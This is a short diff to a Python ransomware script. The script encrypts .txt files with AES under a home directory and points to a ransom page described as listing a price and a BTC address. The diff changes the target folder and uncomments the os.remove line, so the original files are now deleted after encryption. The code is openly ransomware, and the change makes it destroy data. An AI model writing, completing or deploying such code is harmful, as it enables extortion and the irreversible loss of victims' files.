@@ -14,7 +14,7 @@ from Tkinter import *
 from Crypto.Cipher import AES
 
 extensions = ['.txt'] # Testing only with txt files
-homedir = "C:\Users\Python\Desktop\Ransom\File" #Testing only under this directory
+homedir = "C:\Users\Python\Desktop\docu" #Testing only under this directory
 path = os.path.join(homedir, "firstdir")
 url = "https://github.com/luisxciv/SYrans" #Ransom page to display with price, BTC address etc...
 new = 2 # opens in new tab (if possible)
@@ -42,7 +42,7 @@ def encryption(key):
 
                     print "[!] - Deleting Original Files..."
                 # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
-                   # os.remove(os.path.join(root, file))
+                    os.remove(os.path.join(root, file))
                     print "[+] - Original files deleted."
     
                     #Proceeds to next dir
